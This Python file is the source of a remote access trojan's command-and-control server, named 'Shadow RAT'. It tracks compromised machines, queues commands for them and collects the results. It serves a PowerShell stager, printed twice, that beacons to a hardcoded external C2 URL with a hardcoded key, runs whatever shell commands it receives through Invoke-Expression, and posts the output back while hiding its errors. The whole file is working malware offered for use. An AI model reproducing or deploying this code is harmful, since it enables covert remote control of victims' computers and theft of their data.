#!/usr/bin/env python3
"""
Shadow RAT — C2 Server (Flask)
Persistent storage via SQLite (survives Render restarts with disk)
"""
import os, json, sqlite3, threading
from datetime import datetime, timezone
from flask import Flask, request, jsonify

app = Flask(__name__)

SECRET_KEY = os.environ.get("C2_SECRET_KEY", "Youssef123")
DB_PATH    = os.environ.get("DB_PATH", "/tmp/shadow.db")
_lock      = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  DATABASE INIT
# ══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id  TEXT PRIMARY KEY,
            hostname  TEXT,
            username  TEXT,
            os        TEXT,
            arch      TEXT,
            ip        TEXT,
            last_seen TEXT,
            status    TEXT DEFAULT 'offline',
            extra     TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS tasks (
            task_id   TEXT PRIMARY KEY,
            agent_id  TEXT,
            action    TEXT,
            args      TEXT DEFAULT '{}',
            status    TEXT DEFAULT 'pending',
            result    TEXT DEFAULT '',
            issued_at TEXT
        );
        """)
    print(f"[*] SQLite DB ready: {DB_PATH}")

init_db()

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════
def now_iso():
    return datetime.now(timezone.utc).isoformat()

_counter_lock = threading.Lock()
_task_counter = [0]

def new_task_id():
    with _counter_lock:
        # نجيب آخر رقم من DB
        with get_db() as db:
            row = db.execute(
                "SELECT task_id FROM tasks ORDER BY rowid DESC LIMIT 1"
            ).fetchone()
            if row:
                try:
                    _task_counter[0] = int(row["task_id"].split("_")[1])
                except: pass
        _task_counter[0] += 1
        return f"task_{_task_counter[0]:06d}"

def check_auth(body):
    key = body.get("key") or request.headers.get("x-shadow-key", "")
    return key == SECRET_KEY

def is_online(last_seen_iso, threshold=30):
    try:
        ls = datetime.fromisoformat(last_seen_iso).timestamp()
        return (datetime.now(timezone.utc).timestamp() - ls) <= threshold
    except:
        return False

def row_to_dict(row):
    return dict(row) if row else None

# ══════════════════════════════════════════════════════════════
#  MAIN ROUTE
# ══════════════════════════════════════════════════════════════
@app.route("/functions/c2Server", methods=["POST", "GET"])
def c2():
    body  = request.get_json(silent=True) or {}
    route = request.args.get("route") or body.get("route", "")

    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401

    with _lock:

        # ── checkin ──────────────────────────────────────────
        if route == "checkin":
            agent_id = body.get("agent_id")
            if not agent_id:
                return jsonify({"error": "missing agent_id"}), 400

            with get_db() as db:
                db.execute("""
                    INSERT INTO agents (agent_id,hostname,username,os,arch,ip,last_seen,status,extra)
                    VALUES (?,?,?,?,?,?,?,'online',?)
                    ON CONFLICT(agent_id) DO UPDATE SET
                        hostname=excluded.hostname,
                        username=excluded.username,
                        os=excluded.os,
                        arch=excluded.arch,
                        ip=excluded.ip,
                        last_seen=excluded.last_seen,
                        status='online',
                        extra=excluded.extra
                """, (
                    agent_id,
                    body.get("hostname","?"), body.get("username","?"),
                    body.get("os","?"),      body.get("arch","?"),
                    body.get("ip","?"),      now_iso(),
                    body.get("extra","")
                ))

                # pending task?
                row = db.execute("""
                    SELECT * FROM tasks
                    WHERE agent_id=? AND status='pending'
                    ORDER BY rowid ASC LIMIT 1
                """, (agent_id,)).fetchone()

                if row:
                    db.execute("UPDATE tasks SET status='sent' WHERE task_id=?",
                               (row["task_id"],))
                    return jsonify({
                        "task_id": row["task_id"],
                        "action":  row["action"],
                        "args":    json.loads(row["args"] or "{}"),
                    })

            return jsonify({"task_id": None})

        # ── result ───────────────────────────────────────────
        if route == "result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?",
                                 (task_id,)).fetchone()
                if not row:
                    return jsonify({"error": "not found"}), 404
                db.execute(
                    "UPDATE tasks SET result=?, status=? WHERE task_id=?",
                    (body.get("result",""), body.get("status","done"), task_id)
                )
            return jsonify({"ok": True})

        # ── agents list ──────────────────────────────────────
        if route == "agents":
            with get_db() as db:
                rows = db.execute("SELECT * FROM agents").fetchall()
            result = []
            for r in rows:
                a = dict(r)
                a["status"] = "online" if is_online(a.get("last_seen","")) else "offline"
                result.append(a)
            online = [a for a in result if a["status"] == "online"]
            return jsonify({"agents": online, "total": len(result)})

        # ── issue task ───────────────────────────────────────
        if route == "task":
            agent_id = body.get("agent_id")
            action   = body.get("action")
            if not agent_id or not action:
                return jsonify({"error": "missing fields"}), 400
            tid = new_task_id()
            with get_db() as db:
                db.execute("""
                    INSERT INTO tasks (task_id,agent_id,action,args,status,result,issued_at)
                    VALUES (?,?,?,?,'pending','',?)
                """, (tid, agent_id, action,
                      json.dumps(body.get("args",{})), now_iso()))
            return jsonify({"task_id": tid})

        # ── get result ───────────────────────────────────────
        if route == "get_result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?",
                                 (task_id,)).fetchone()
            if not row:
                return jsonify({"error": "not found"}), 404
            return jsonify(dict(row))

        # ── delete agent ─────────────────────────────────────
        if route == "delete_agent":
            agent_id = body.get("agent_id")
            if agent_id:
                with get_db() as db:
                    db.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            return jsonify({"ok": True})

        # ── stats ─────────────────────────────────────────────
        if route == "stats":
            with get_db() as db:
                total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
                total_tasks  = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
                pending      = db.execute(
                    "SELECT COUNT(*) FROM tasks WHERE status='pending'"
                ).fetchone()[0]
            return jsonify({
                "total_agents": total_agents,
                "total_tasks":  total_tasks,
                "pending_tasks": pending
            })


        if route == "ps_agent":
            stager = (
                "$ErrorActionPreference='SilentlyContinue'\\n"
                "$u='https://shadow-c2-server.onrender.com/functions/c2Server'\\n"
                "$k='Youssef123'\\n"
                "$id=[System.Guid]::NewGuid().ToString()\\n"
                "while($true){\\n"
                "  try{\\n"
                "    $b=[Text.Encoding]::UTF8.GetBytes((@{route='checkin';key=$k;id=$id;os='Windows';user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch='x64'}|ConvertTo-Json))\\n"
                "    $r=[Net.WebRequest]::Create($u+'?route=checkin');$r.Method='POST';$r.ContentType='application/json';$r.ContentLength=$b.Length\\n"
                "    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close()\\n"
                "    $d=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json\\n"
                "    if($d.action -eq 'shell'){\\n"
                "      $o=Invoke-Expression $d.args.cmd 2>&1|Out-String\\n"
                "      $rb=[Text.Encoding]::UTF8.GetBytes((@{route='result';key=$k;task_id=$d.task_id;output=$o}|ConvertTo-Json))\\n"
                "      $r2=[Net.WebRequest]::Create($u+'?route=result');$r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length\\n"
                "      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close();$r2.GetResponse()|Out-Null\\n"
                "    }\\n"
                "  }catch{}\\n"
                "  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\\n"
                "}\\n"
            )
            return stager, 200, {"Content-Type": "text/plain"}

    return jsonify({"error": "unknown route"}), 404


@app.route("/", methods=["GET"])
def health():
    with get_db() as db:
        agents_count = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        tasks_count  = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
    return jsonify({
        "status":  "Shadow C2 online",
        "db":      DB_PATH,
        "agents":  agents_count,
        "tasks":   tasks_count
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)


@app.route("/ps_agent", methods=["GET"])
def ps_agent():
    stager = (
        "$ErrorActionPreference='SilentlyContinue'\\n"
        "$u='https://shadow-c2-server.onrender.com/functions/c2Server'\\n"
        "$k='Youssef123'\\n"
        "$id=[System.Guid]::NewGuid().ToString()\\n"
        "while($true){\\n"
        "  try{\\n"
        "    $b=[Text.Encoding]::UTF8.GetBytes((@{route='checkin';key=$k;id=$id;os='Windows';user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch='x64'}|ConvertTo-Json))\\n"
        "    $r=[Net.WebRequest]::Create($u+'?route=checkin');$r.Method='POST';$r.ContentType='application/json';$r.ContentLength=$b.Length\\n"
        "    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close()\\n"
        "    $d=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json\\n"
        "    if($d.action -eq 'shell'){\\n"
        "      $o=Invoke-Expression $d.args.cmd 2>&1|Out-String\\n"
        "      $rb=[Text.Encoding]::UTF8.GetBytes((@{route='result';key=$k;task_id=$d.task_id;output=$o}|ConvertTo-Json))\\n"
        "      $r2=[Net.WebRequest]::Create($u+'?route=result');$r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length\\n"
        "      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close();$r2.GetResponse()|Out-Null\\n"
        "    }\\n"
        "  }catch{}\\n"
        "  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\\n"
        "}\\n"
    )
    return stager, 200, {"Content-Type": "text/plain"}
